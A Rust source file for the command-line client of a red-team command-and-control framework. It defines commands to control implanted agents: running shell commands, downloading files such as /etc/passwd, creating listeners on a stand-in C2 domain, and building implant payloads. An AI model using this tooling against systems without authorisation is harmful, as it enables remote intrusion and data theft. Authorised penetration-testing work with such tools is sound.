use clap::{Parser, Subcommand};
use tracing_subscriber::EnvFilter;

mod client;
mod commands;
mod config;
mod error;
mod output;

use error::{CliError, EXIT_GENERAL, EXIT_SUCCESS};
use output::OutputFormat;

// ── top-level CLI ─────────────────────────────────────────────────────────────

/// Red Cell C2 command-line client.
///
/// Communicates with a Red Cell teamserver over its JSON REST/WebSocket API.
/// All output is JSON by default — machine-parseable on stdout, structured
/// errors on stderr.
///
/// Authentication is resolved in this order (first wins):
///
///   1. --server / --token flags
///   2. RC_SERVER / RC_TOKEN environment variables
///   3. .red-cell-cli.toml in the current or any parent directory
///   4. ~/.config/red-cell-cli/config.toml
///
/// Exit codes:
///   0  success
///   1  general / argument error
///   2  not found
///   3  auth failure (bad token, insufficient role)
///   4  server unreachable
///   5  timeout exceeded
#[derive(Debug, Parser)]
#[command(name = "red-cell-cli", author, version, about, long_about = None)]
#[command(propagate_version = true)]
#[command(disable_help_subcommand = true)]
#[command(
    after_help = "Environment:\n  RC_SERVER   Teamserver URL  (e.g. https://ts.example.com:40056)\n  RC_TOKEN    API token\n\nExamples:\n  red-cell-cli status\n  red-cell-cli agent list\n  red-cell-cli agent exec abc123 --cmd whoami --wait"
)]
pub struct Cli {
    /// Teamserver base URL (e.g. https://teamserver:40056)
    #[arg(long, short = 's', env = "RC_SERVER", global = true)]
    pub server: Option<String>,

    /// API authentication token
    #[arg(long, short = 't', env = "RC_TOKEN", global = true)]
    pub token: Option<String>,

    /// Output format
    #[arg(long, short = 'o', global = true, default_value = "json")]
    pub output: OutputFormat,

    /// Request timeout in seconds
    #[arg(long, global = true, default_value = "30")]
    pub timeout: u64,

    #[command(subcommand)]
    pub command: Option<Commands>,
}

// ── subcommands ───────────────────────────────────────────────────────────────

/// Available top-level subcommands.
#[derive(Debug, Subcommand)]
pub enum Commands {
    /// Check teamserver connectivity and verify credentials.
    ///
    /// Examples:
    ///   red-cell-cli status
    ///   red-cell-cli --server https://ts:40056 --token mytoken status
    #[command(verbatim_doc_comment)]
    Status,

    /// Manage connected agents.
    ///
    /// Examples:
    ///   red-cell-cli agent list
    ///   red-cell-cli agent show <id>
    ///   red-cell-cli agent exec <id> --cmd whoami --wait
    #[command(verbatim_doc_comment)]
    Agent {
        #[command(subcommand)]
        action: AgentCommands,
    },

    /// Manage listeners (HTTP/S, DNS, SMB, external).
    ///
    /// Examples:
    ///   red-cell-cli listener list
    ///   red-cell-cli listener show mylistener
    ///   red-cell-cli listener create --name http1 --type http --port 443
    #[command(verbatim_doc_comment)]
    Listener {
        #[command(subcommand)]
        action: ListenerCommands,
    },

    /// Build and manage payloads.
    ///
    /// Examples:
    ///   red-cell-cli payload list
    ///   red-cell-cli payload build --listener http1 --os windows --arch x86_64
    ///   red-cell-cli payload download <id> --out ./payload.exe
    #[command(verbatim_doc_comment)]
    Payload {
        #[command(subcommand)]
        action: PayloadCommands,
    },

    /// Manage operators and role-based access control.
    ///
    /// Examples:
    ///   red-cell-cli operator list
    ///   red-cell-cli operator create alice --role operator
    ///   red-cell-cli operator set-role alice admin
    #[command(verbatim_doc_comment)]
    Operator {
        #[command(subcommand)]
        action: OperatorCommands,
    },

    /// View and stream the audit log.
    ///
    /// Examples:
    ///   red-cell-cli log list
    ///   red-cell-cli log list --operator alice --limit 50
    ///   red-cell-cli log tail
    #[command(name = "log", verbatim_doc_comment)]
    Audit {
        #[command(subcommand)]
        action: AuditCommands,
    },

    /// Start a persistent JSON-pipe session for long-running agent interactions.
    ///
    /// Reads newline-delimited JSON commands from stdin and writes JSON
    /// responses to stdout.  Keeps a single authenticated connection open so
    /// re-auth overhead is paid only once.
    ///
    /// If --agent is given, commands that require an agent ID will use it as
    /// the default when "id" is not present in the JSON message.
    ///
    /// Examples:
    ///   red-cell-cli session
    ///   red-cell-cli session --agent abc123
    ///   echo '{"cmd":"ping"}' | red-cell-cli session
    #[command(verbatim_doc_comment)]
    Session {
        /// Default agent ID (used when a command does not include "id")
        #[arg(long)]
        agent: Option<String>,
    },

    /// Show help for a subcommand (alias: `<command> --help`).
    ///
    /// Examples:
    ///   red-cell-cli help
    ///   red-cell-cli help agent
    ///   red-cell-cli help listener
    #[command(verbatim_doc_comment)]
    Help {
        /// Subcommand to show help for (omit for top-level help)
        command: Option<String>,
    },
}

// ── agent subcommands ─────────────────────────────────────────────────────────

/// Agent subcommands.
#[derive(Debug, Subcommand)]
pub enum AgentCommands {
    /// List all registered agents.
    ///
    /// Examples:
    ///   red-cell-cli agent list
    #[command(verbatim_doc_comment)]
    List,

    /// Show full details of a single agent.
    ///
    /// Examples:
    ///   red-cell-cli agent show abc123
    #[command(verbatim_doc_comment)]
    Show {
        /// Agent ID
        id: String,
    },

    /// Execute a shell command on an agent.
    ///
    /// Without --wait: returns immediately with a job ID.
    /// With --wait:    blocks until the agent returns output (exit code 5 on timeout).
    ///
    /// Examples:
    ///   red-cell-cli agent exec abc123 --cmd "whoami"
    ///   red-cell-cli agent exec abc123 --cmd "ipconfig /all" --wait --timeout 30
    #[command(verbatim_doc_comment)]
    Exec {
        /// Agent ID
        id: String,
        /// Shell command to execute on the agent
        #[arg(long)]
        cmd: String,
        /// Block until the agent returns output
        #[arg(long)]
        wait: bool,
        /// Seconds to wait before returning exit code 5 (default: 60)
        #[arg(long)]
        timeout: Option<u64>,
    },

    /// Retrieve pending task output from an agent.
    ///
    /// Examples:
    ///   red-cell-cli agent output abc123
    ///   red-cell-cli agent output abc123 --watch
    ///   red-cell-cli agent output abc123 --since job_xyz --watch
    #[command(verbatim_doc_comment)]
    Output {
        /// Agent ID
        id: String,
        /// Stream new output as it arrives (prints JSON lines until Ctrl-C)
        #[arg(long)]
        watch: bool,
        /// Only fetch output newer than this job ID
        #[arg(long)]
        since: Option<String>,
    },

    /// Terminate an agent.
    ///
    /// Examples:
    ///   red-cell-cli agent kill abc123
    ///   red-cell-cli agent kill abc123 --wait
    #[command(verbatim_doc_comment)]
    Kill {
        /// Agent ID
        id: String,
        /// Block until the agent's status becomes "dead"
        #[arg(long)]
        wait: bool,
    },

    /// Upload a local file to an agent.
    ///
    /// Examples:
    ///   red-cell-cli agent upload abc123 --src ./payload.exe --dst "C:\\Temp\\p.exe"
    #[command(verbatim_doc_comment)]
    Upload {
        /// Agent ID
        id: String,
        /// Local path of the file to upload
        #[arg(long)]
        src: String,
        /// Destination path on the remote agent
        #[arg(long)]
        dst: String,
    },

    /// Download a file from an agent to local disk.
    ///
    /// Examples:
    ///   red-cell-cli agent download abc123 --src /etc/passwd --dst ./passwd.txt
    #[command(verbatim_doc_comment)]
    Download {
        /// Agent ID
        id: String,
        /// Source path on the remote agent
        #[arg(long)]
        src: String,
        /// Local path to write the downloaded file
        #[arg(long)]
        dst: String,
    },
}

// ── listener subcommands ──────────────────────────────────────────────────────

/// Listener subcommands.
#[derive(Debug, Subcommand)]
pub enum ListenerCommands {
    /// List all configured listeners.
    ///
    /// Examples:
    ///   red-cell-cli listener list
    #[command(verbatim_doc_comment)]
    List,

    /// Show full details of a single listener.
    ///
    /// Examples:
    ///   red-cell-cli listener show http1
    #[command(verbatim_doc_comment)]
    Show {
        /// Listener name
        name: String,
    },

    /// Create a new listener.
    ///
    /// For simple cases supply individual flags; for complex HTTP listeners
    /// with headers, URIs, or proxy config pass --config-json instead.
    ///
    /// Examples:
    ///   red-cell-cli listener create --name http1 --type http --port 443
    ///   red-cell-cli listener create --name dns1  --type dns  --domain c2.evil.example.com
    ///   red-cell-cli listener create --name smb1  --type smb  --pipe-name my-pipe
    ///   red-cell-cli listener create --name ext1  --type external --endpoint /bridge
    ///   red-cell-cli listener create --name http1 --type http --config-json '{"name":"http1","host_bind":"0.0.0.0","port_bind":443,"host_rotation":"round-robin"}'
    #[command(verbatim_doc_comment)]
    Create {
        /// Listener display name
        #[arg(long)]
        name: String,

        /// Protocol: http, dns, smb, or external
        #[arg(long = "type")]
        listener_type: String,

        /// Bind port (HTTP default: 443, DNS default: 53)
        #[arg(long)]
        port: Option<u16>,

        /// Local interface to bind (default: 0.0.0.0)
        #[arg(long, default_value = "0.0.0.0")]
        host: String,

        /// C2 domain suffix handled by a DNS listener (required for --type dns)
        #[arg(long)]
        domain: Option<String>,

        /// Named pipe for SMB pivot traffic (required for --type smb)
        #[arg(long)]
        pipe_name: Option<String>,

        /// HTTP path registered on the teamserver (required for --type external)
        #[arg(long)]
        endpoint: Option<String>,

        /// Enable TLS for HTTP listeners (HTTPS)
        #[arg(long, default_value_t = false)]
        secure: bool,

        /// Full listener config as a raw JSON object (overrides all flags
        /// above; the JSON must match the server's inner config shape for
        /// the chosen --type)
        #[arg(long)]
        config_json: Option<String>,
    },

    /// Start a stopped listener (idempotent: already-running returns ok).
    ///
    /// Examples:
    ///   red-cell-cli listener start http1
    #[command(verbatim_doc_comment)]
    Start {
        /// Listener name
        name: String,
    },

    /// Stop a running listener (idempotent: already-stopped returns ok).
    ///
    /// Examples:
    ///   red-cell-cli listener stop http1
    #[command(verbatim_doc_comment)]
    Stop {
        /// Listener name
        name: String,
    },

    /// Delete a listener.
    ///
    /// Examples:
    ///   red-cell-cli listener delete http1
    #[command(verbatim_doc_comment)]
    Delete {
        /// Listener name
        name: String,
    },
}

// ── payload subcommands ───────────────────────────────────────────────────────

/// Payload subcommands.
#[derive(Debug, Subcommand)]
pub enum PayloadCommands {
    /// Build a new payload.
    ///
    /// Without --wait: submits the build job and returns a job_id immediately.
    /// With --wait:    blocks until the build completes and returns payload metadata.
    ///
    /// Examples:
    ///   red-cell-cli payload build --listener http1 --arch x86_64 --format exe
    ///   red-cell-cli payload build --listener dns1  --arch aarch64 --format bin --sleep 5 --wait
    #[command(verbatim_doc_comment)]
    Build {
        /// Listener name the payload connects back to
        #[arg(long)]
        listener: String,
        /// Target architecture (x86_64, x86, aarch64)
        #[arg(long)]
        arch: String,
        /// Output format (exe, dll, bin)
        #[arg(long)]
        format: String,
        /// Agent sleep interval in seconds
        #[arg(long)]
        sleep: Option<u64>,
        /// Block until the build finishes (polls for completion)
        #[arg(long)]
        wait: bool,
    },

    /// List previously built payloads.
    ///
    /// Examples:
    ///   red-cell-cli payload list
    #[command(verbatim_doc_comment)]
    List,

    /// Download a built payload to disk.
    ///
    /// Examples:
    ///   red-cell-cli payload download <id> --dst ./payload.exe
    #[command(verbatim_doc_comment)]
    Download {
        /// Payload ID
        id: String,
        /// Local path to write the downloaded payload
        #[arg(long)]
        dst: String,
    },
}

// ── operator subcommands ──────────────────────────────────────────────────────

/// Operator subcommands.
#[derive(Debug, Subcommand)]
pub enum OperatorCommands {
    /// List all operators.
    ///
    /// Examples:
    ///   red-cell-cli operator list
    #[command(verbatim_doc_comment)]
    List,

    /// Create a new operator account.
    ///
    /// Examples:
    ///   red-cell-cli operator create alice --role operator
    ///   red-cell-cli operator create bob   --role admin
    #[command(verbatim_doc_comment)]
    Create {
        /// Operator username
        username: String,
        /// Role (admin, operator, viewer)
        #[arg(long, default_value = "operator")]
        role: String,
    },

    /// Delete an operator account.
    ///
    /// Examples:
    ///   red-cell-cli operator delete alice
    #[command(verbatim_doc_comment)]
    Delete {
        /// Operator username
        username: String,
    },

    /// Change an operator's role.
    ///
    /// Examples:
    ///   red-cell-cli operator set-role alice admin
    ///   red-cell-cli operator set-role bob   viewer
    #[command(verbatim_doc_comment)]
    SetRole {
        /// Operator username
        username: String,
        /// New role (admin, operator, viewer)
        role: String,
    },
}

// ── audit/log subcommands ─────────────────────────────────────────────────────

/// Audit log subcommands.
#[derive(Debug, Subcommand)]
pub enum AuditCommands {
    /// List audit log entries (newest first).
    ///
    /// Examples:
    ///   red-cell-cli log list
    ///   red-cell-cli log list --operator alice --limit 50
    ///   red-cell-cli log list --action exec
    ///   red-cell-cli log list --since 2026-03-21T00:00:00Z --agent abc123
    #[command(verbatim_doc_comment)]
    List {
        /// Filter by operator username
        #[arg(long)]
        operator: Option<String>,
        /// Filter by action type
        #[arg(long)]
        action: Option<String>,
        /// Filter by agent ID
        #[arg(long)]
        agent: Option<String>,
        /// Only return entries at or after this ISO 8601 UTC timestamp
        #[arg(long)]
        since: Option<String>,
        /// Maximum entries to return
        #[arg(long, default_value = "100")]
        limit: u32,
    },

    /// Stream new audit log entries as they arrive.
    ///
    /// Prints the last 20 entries.  With --follow, streams new entries as
    /// JSON lines until Ctrl-C.
    ///
    /// Examples:
    ///   red-cell-cli log tail
    ///   red-cell-cli log tail --follow
    #[command(verbatim_doc_comment)]
    Tail {
        /// Stream new entries as they arrive (prints JSON lines until Ctrl-C)
        #[arg(long)]
        follow: bool,
    },
}

// ── help handler ──────────────────────────────────────────────────────────────

/// Print help for the given subcommand name, or top-level help if `None`.
///
/// Returns the appropriate process exit code.
fn handle_help(command: Option<&str>) -> i32 {
    use clap::CommandFactory;
    let mut root = Cli::command();
    match command {
        None => {
            root.print_help().ok();
            println!();
            EXIT_SUCCESS
        }
        Some(name) => {
            if let Some(sub) = root.find_subcommand_mut(name) {
                sub.print_long_help().ok();
                println!();
                EXIT_SUCCESS
            } else {
                eprintln!("error: unknown command '{name}'");
                eprintln!();
                root.print_help().ok();
                println!();
                EXIT_GENERAL
            }
        }
    }
}

// ── entry point ───────────────────────────────────────────────────────────────

fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .with_writer(std::io::stderr)
        .init();

    let cli = Cli::parse();

    // Bare invocation: print help and exit 0.
    if cli.command.is_none() {
        use clap::CommandFactory;
        Cli::command().print_help().ok();
        println!();
        std::process::exit(EXIT_SUCCESS);
    }

    // `help [command]` doesn't need a server or token — handle it before the
    // async runtime is started.
    if let Some(Commands::Help { ref command }) = cli.command {
        let code = handle_help(command.as_deref());
        std::process::exit(code);
    }

    let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
        Ok(rt) => rt,
        Err(e) => {
            eprintln!("fatal: failed to build async runtime: {e}");
            std::process::exit(error::EXIT_GENERAL);
        }
    };

    let exit_code = rt.block_on(dispatch(cli));
    std::process::exit(exit_code);
}

// ── async dispatcher ──────────────────────────────────────────────────────────

async fn dispatch(cli: Cli) -> i32 {
    // Capture output format before partial moves.
    let fmt = cli.output.clone();

    // Resolve configuration (CLI flags + env vars were already absorbed by
    // clap; this step adds the file-based fallbacks).
    let resolved = match config::resolve(cli.server, cli.token, cli.timeout) {
        Ok(cfg) => cfg,
        Err(e) => {
            let err: CliError = e.into();
            output::print_error(&err);
            return err.exit_code();
        }
    };

    // Build the shared API client.
    let api_client = match client::ApiClient::new(&resolved) {
        Ok(c) => c,
        Err(e) => {
            output::print_error(&e);
            return e.exit_code();
        }
    };

    let Some(command) = cli.command else {
        // Unreachable: bare invocation is handled in main().
        return EXIT_SUCCESS;
    };

    match command {
        Commands::Status => match commands::status::run(&api_client).await {
            Ok(data) => {
                output::print_success(&fmt, &data);
                EXIT_SUCCESS
            }
            Err(e) => {
                output::print_error(&e);
                e.exit_code()
            }
        },

        Commands::Agent { action } => commands::agent::run(&api_client, &fmt, action).await,

        Commands::Listener { action } => commands::listener::run(&api_client, &fmt, action).await,

        Commands::Payload { action } => commands::payload::run(&api_client, &fmt, action).await,

        Commands::Audit { action } => commands::audit::run(&api_client, &fmt, action).await,

        Commands::Session { agent } => commands::session::run(&api_client, agent.as_deref()).await,

        // Remaining commands are implemented in downstream issues.
        Commands::Operator { .. } => {
            let err = CliError::General("this subcommand is not yet implemented".to_owned());
            output::print_error(&err);
            err.exit_code()
        }

        // Handled synchronously in main() before the runtime is started;
        // this arm exists only for exhaustiveness.
        Commands::Help { .. } => EXIT_SUCCESS,
    }
}

// ── tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use clap::{CommandFactory, Parser};

    use super::*;

    // ── top-level help content ───────────────────────────────────────────────

    #[test]
    fn top_level_help_contains_rc_server() {
        let help = Cli::command().render_long_help().to_string();
        assert!(help.contains("RC_SERVER"), "top-level help must mention RC_SERVER");
    }

    #[test]
    fn top_level_help_contains_rc_token() {
        let help = Cli::command().render_long_help().to_string();
        assert!(help.contains("RC_TOKEN"), "top-level help must mention RC_TOKEN");
    }

    #[test]
    fn top_level_help_contains_examples_section() {
        let help = Cli::command().render_long_help().to_string();
        assert!(help.contains("Examples:"), "top-level help must have an Examples section");
        assert!(
            help.contains("red-cell-cli status"),
            "top-level help examples must include 'red-cell-cli status'"
        );
        assert!(
            help.contains("red-cell-cli agent list"),
            "top-level help examples must include 'red-cell-cli agent list'"
        );
    }

    #[test]
    fn top_level_help_contains_environment_section() {
        let help = Cli::command().render_long_help().to_string();
        assert!(help.contains("Environment:"), "top-level help must have an Environment section");
    }

    // ── per-subcommand examples ──────────────────────────────────────────────

    /// Every direct child of the root command must have "Examples:" in its long help.
    #[test]
    fn every_top_level_subcommand_has_examples() {
        let mut cmd = Cli::command();
        for sub in cmd.get_subcommands_mut() {
            let name = sub.get_name().to_owned();
            let help = sub.render_long_help().to_string();
            assert!(
                help.contains("Examples:"),
                "subcommand '{name}' help is missing an Examples section"
            );
        }
    }

    /// Spot-check a selection of second-level subcommands for examples.
    #[test]
    fn nested_subcommands_have_examples() {
        let mut cmd = Cli::command();

        // agent → exec
        let agent_exec_help = cmd
            .find_subcommand_mut("agent")
            .expect("agent subcommand")
            .find_subcommand_mut("exec")
            .expect("agent exec subcommand")
            .render_long_help()
            .to_string();
        assert!(agent_exec_help.contains("Examples:"), "agent exec help missing Examples");

        // listener → create
        let mut cmd2 = Cli::command();
        let listener_create_help = cmd2
            .find_subcommand_mut("listener")
            .expect("listener subcommand")
            .find_subcommand_mut("create")
            .expect("listener create subcommand")
            .render_long_help()
            .to_string();
        assert!(
            listener_create_help.contains("Examples:"),
            "listener create help missing Examples"
        );

        // log → list
        let mut cmd3 = Cli::command();
        let log_list_help = cmd3
            .find_subcommand_mut("log")
            .expect("log subcommand")
            .find_subcommand_mut("list")
            .expect("log list subcommand")
            .render_long_help()
            .to_string();
        assert!(log_list_help.contains("Examples:"), "log list help missing Examples");
    }

    // ── help subcommand parsing ───────────────────────────────────────────────

    #[test]
    fn bare_invocation_yields_none_command() {
        let cli = Cli::try_parse_from(["red-cell-cli"]).expect("parse bare invocation");
        assert!(cli.command.is_none());
    }

    #[test]
    fn help_subcommand_parses_with_no_arg() {
        let cli = Cli::try_parse_from(["red-cell-cli", "help"]).expect("parse 'help'");
        assert!(matches!(cli.command, Some(Commands::Help { command: None })));
    }

    #[test]
    fn help_subcommand_parses_with_agent_arg() {
        let cli =
            Cli::try_parse_from(["red-cell-cli", "help", "agent"]).expect("parse 'help agent'");
        assert!(
            matches!(&cli.command, Some(Commands::Help { command: Some(c) }) if c == "agent"),
            "expected Help {{ command: Some(\"agent\") }}"
        );
    }

    #[test]
    fn help_subcommand_parses_with_listener_arg() {
        let cli = Cli::try_parse_from(["red-cell-cli", "help", "listener"])
            .expect("parse 'help listener'");
        assert!(
            matches!(&cli.command, Some(Commands::Help { command: Some(c) }) if c == "listener")
        );
    }

    // ── unknown command handling ──────────────────────────────────────────────

    #[test]
    fn unknown_command_fails_to_parse_without_panic() {
        let result = Cli::try_parse_from(["red-cell-cli", "frobnicator"]);
        assert!(result.is_err(), "unknown command must fail to parse");
    }

    #[test]
    fn handle_help_unknown_returns_exit_general() {
        let code = handle_help(Some("totally-unknown-command"));
        assert_eq!(code, EXIT_GENERAL);
    }

    #[test]
    fn handle_help_none_returns_exit_success() {
        let code = handle_help(None);
        assert_eq!(code, EXIT_SUCCESS);
    }

    #[test]
    fn handle_help_known_command_returns_exit_success() {
        let code = handle_help(Some("agent"));
        assert_eq!(code, EXIT_SUCCESS);
    }

    // ── log command name ──────────────────────────────────────────────────────

    #[test]
    fn audit_variant_is_exposed_as_log_command() {
        // The CLI name must be "log", not "audit".
        let cli =
            Cli::try_parse_from(["red-cell-cli", "log", "list"]).expect("'log list' must parse");
        assert!(matches!(cli.command, Some(Commands::Audit { .. })));
    }
}
